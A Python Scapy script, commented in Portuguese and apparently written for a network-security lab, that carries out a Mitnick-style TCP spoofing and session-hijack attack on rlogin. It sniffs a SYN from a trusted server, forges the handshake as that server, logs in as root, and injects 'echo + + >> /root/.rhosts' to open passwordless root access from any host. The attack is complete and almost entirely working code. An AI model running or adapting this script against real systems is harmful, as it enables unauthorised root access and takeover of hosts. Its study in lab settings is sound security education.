from scapy.all import sniff, IP, TCP, send
from get_iface import get_iface


ATTACKER       = "10.9.0.1"
X_TERMINAL     = "10.9.0.5"
TRUSTED_SERVER = "10.9.0.6"
STATE = "start_state"


def rsh_start_login():
    """
        Retorna payload para iniciar conexão rlogin

        O payload é composto por:
        - <null>
        - client-user-name: root
        - <null>
        - server-user-name: root
        - <null>
        - terminal type: vt100/38400
        - <null>

        Referência: https://datatracker.ietf.org/doc/html/rfc1282
    """
    return b"\x00root\x00root\x00vt100/38400\x00"

def rsh_command_payload():
    """
        Retorna payload para executar comando no servidor rlogin

        O payload é composto por:
        - comando a ser executado: echo "+ +" >> /root/.rhosts
        - <null>

        Referência: https://datatracker.ietf.org/doc/html/rfc1282
    """
    # Simula o comando "echo + + >> /root/.rhosts"
    return b"echo + + >> /root/.rhosts\x0a."

def packet_callback(packet):
    """
        Função de callback para capturar pacotes na rede

        O estado da conexão é controlado por STATE, que é alterado
        conforme os pacotes são capturados e enviados.

        O estado inicial é "start_state", onde aguardamos o SYN do Trusted Server
        para o X Terminal. Em seguida, forjamos o three-way handshake com
        o X Terminal, utilizando o ISN capturado. Após isso, enviamos o payload
        para iniciar a conexão rlogin.

        O estado "rsh_start_login_state" é utilizado para aguardar a resposta do
        servidor rlogin. O estado "wait_prompt_state" é utilizado para aguardar 
        o prompt de comando do servidor rlogin. O estado "send_payload_state" é 
        utilizado para enviar o payload para executar o comando no servidor 
        rlogin. O estado "wait_payload_ack_state" é utilizado para aguardar a 
        resposta do servidor rlogin.

        O estado "finished_state" é utilizado para finalizar a execução do script.

        Referência: https://datatracker.ietf.org/doc/html/rfc1282
    """

    global STATE

    # Aguarda TRUSTED_SERVER enviar o SYN para X_TERMINAL, como o arp spoofing 
    # está rodando, o SYN do TRUSTED_SERVER não chega ao X_TERMINAL.
    # Capturamos o ISN do TRUSTED_SERVER então e enviamos um SYN para X_TERMINAL
    if STATE == "start_state":
        pckt_condition = packet.haslayer("TCP") and packet["TCP"].flags == "S"
        pckt_condition = pckt_condition and packet["IP"].src == TRUSTED_SERVER
        pckt_condition = pckt_condition and packet["IP"].dst == X_TERMINAL
        pckt_condition = pckt_condition and packet["IP"].dport == 513

        if pckt_condition:
            STATE = "syn_sent_state"

            print("===========================================================")
            print(f"Pacote de {TRUSTED_SERVER} para {X_TERMINAL} interceptado")
            print(f"Pacote SYN com ISN: {packet['TCP'].seq}")

            # Montando o SYN para X_TERMINAL
            ip_pckt = IP(
                src   = TRUSTED_SERVER, 
                dst   = X_TERMINAL
            )

            tcp_pckt = TCP(
                sport = packet["TCP"].sport, 
                dport = packet["TCP"].dport, 
                flags = "S", 
                seq   = packet['TCP'].seq
            )

            response = ip_pckt / tcp_pckt
            
            print(f"Mandando pacote SYN para {X_TERMINAL}")
            send(response, verbose=False)
    
    # Aguarda X_TERMINAL responder com SYN-ACK.
    # Forjamos o three-way handshake com X_TERMINAL utilizando o ISN capturado
    # (respondemos ACK ao SYN-ACK de X_TERMINAL)
    # Em seguida, enviamos o payload para iniciar a conexão rlogin
    if STATE == "syn_sent_state":
        pckt_condition = packet.haslayer("TCP") and packet["TCP"].flags == "SA"
        pckt_condition = pckt_condition and packet["IP"].src == X_TERMINAL
        pckt_condition = pckt_condition and packet["IP"].dst == TRUSTED_SERVER
        pckt_condition = pckt_condition and packet["IP"].sport == 513

        if pckt_condition:
            STATE = "rsh_start_login_state"
            print("===========================================================")
            print(f"Pacote de {X_TERMINAL} para {TRUSTED_SERVER} interceptado")
            print(f"Pacote SYN-ACK com ISN: {packet['TCP'].seq}")

            ip_pckt = IP(
                src = TRUSTED_SERVER, 
                dst = X_TERMINAL
            )
            tcp_pckt = TCP(
                sport = packet["TCP"].dport, 
                dport = packet["TCP"].sport, 
                flags = "A", 
                seq   = packet["TCP"].ack, 
                ack   = packet["TCP"].seq + 1
            )

            response = ip_pckt / tcp_pckt

            print(f"Mandando pacote ACK para {X_TERMINAL}")
            send(response, verbose=False)

            ip_pckt = IP(
                src = TRUSTED_SERVER, 
                dst = X_TERMINAL
            )
            tcp_pckt = TCP(
                sport = packet["TCP"].dport, 
                dport = packet["TCP"].sport, 
                flags = "PA", 
                seq   = packet["TCP"].ack, 
                ack   = packet["TCP"].seq + 1
            )
            
            response = ip_pckt / tcp_pckt / rsh_start_login()
            
            print("Mandando pacote rsh com payload de inicio de sessao")
            send(response, verbose=False)

    # Aguarda resposta do servidor rlogin
    # Envia ACK para cada mensagem recebida
    # Verifica se a mensagem recebida comeca com prompt de comando root
    if STATE == "rsh_start_login_state":
        pckt_condition = packet.haslayer("TCP") and packet["TCP"].flags == "PA"
        pckt_condition = pckt_condition and packet["IP"].src == X_TERMINAL
        pckt_condition = pckt_condition and packet["IP"].dst == TRUSTED_SERVER
        pckt_condition = pckt_condition and packet["IP"].sport == 513

        if pckt_condition:
            STATE = "wait_prompt_state"
            print("===========================================================")
            print(f"Pacote de {X_TERMINAL} para {TRUSTED_SERVER} interceptado")
            print(f"Pacote rsh de login")

    # Aguarda prompt de comando do servidor rlogin
    # Envia payload para executar comando no servidor rlogin
    if STATE == "wait_prompt_state":
        pckt_condition = packet.haslayer("TCP") and packet["TCP"].flags == "PA"
        pckt_condition = pckt_condition and packet["IP"].src == X_TERMINAL
        pckt_condition = pckt_condition and packet["IP"].dst == TRUSTED_SERVER
        pckt_condition = pckt_condition and packet["IP"].sport == 513

        if pckt_condition:
            # Checa se a mensagem começa com o prompt de comando root
            # Se sim, envia payload para executar comando no servidor rlogin
            # Senão, continua enviando ACK para cada mensagem recebida

            print("===========================================================")
            print(f"Pacote de {X_TERMINAL} para {TRUSTED_SERVER} interceptado")
            print(f"Pacote rsh de prompt de comando")

            if packet["TCP"].load.startswith(b"root"):
                STATE = "send_payload_state"

            ip_pckt = IP(
                src = TRUSTED_SERVER, 
                dst = X_TERMINAL
            )
            tcp_pckt = TCP(
                sport = packet["TCP"].dport, 
                dport = packet["TCP"].sport, 
                flags = "A", 
                seq   = packet["TCP"].ack, 
                ack   = packet["TCP"].seq + 1
            )

            response = ip_pckt / tcp_pckt
            print(f"Mandando pacote ACK para {X_TERMINAL}")
            send(response, verbose=False)

        if STATE == "send_payload_state":
            STATE = "wait_payload_ack_state"

            ip_pckt = IP(
                src = TRUSTED_SERVER, 
                dst = X_TERMINAL
            )
            tcp_pckt = TCP(
                sport = packet["TCP"].dport, 
                dport = packet["TCP"].sport, 
                flags = "PA", 
                seq   = packet["TCP"].ack, 
                ack   = packet["TCP"].seq + 1
            )

            response = ip_pckt / tcp_pckt / rsh_command_payload()
            
            print("Mandando pacote rsh com payload com comando a ser executado")
            send(response, verbose=False)

    # Aguarda resposta do servidor rlogin
    # Verifica se a mensagem recebida é um ACK
    # Se sim, finaliza a execução do script
    if STATE == "wait_payload_ack_state":
        pckt_condition = packet.haslayer("TCP") and packet["TCP"].flags == "PA"
        pckt_condition = pckt_condition and packet["IP"].src == X_TERMINAL
        pckt_condition = pckt_condition and packet["IP"].dst == TRUSTED_SERVER
        pckt_condition = pckt_condition and packet["IP"].sport == 513

        if pckt_condition:
            STATE = "finished_state"
            print("===========================================================")
            print(f"Pacote de {X_TERMINAL} para {TRUSTED_SERVER} interceptado")
            print(f"Pacote ACK com ISN: {packet['TCP'].seq}")

    # Finaliza a execução do script
    # Conexão forjada com sucesso
    # Comando executado no servidor rlogin
    # Conecte ao X_TERMINAL
    if STATE == "finished_state":
        print("===========================================================")
        print(f"Conexão forjada com sucesso, comando executado!")
        print(f"Conecte ao {X_TERMINAL}!")
        print("===========================================================")
        exit()


if __name__ == "__main__":
    # Pega o nome da rede onde as máquinas estão conectadas
    iface = get_iface(ATTACKER)

    # Inicia a captura de pacotes na interface de rede das maquinas
    # para interceptar a conexão rlogin entre o Trusted Server e o X Terminal
    # e forjar a conexão rlogin entre o Trusted Server e o atacante
    # (o atacante se passa pelo X Terminal)
    sniff(iface=iface, prn=packet_callback)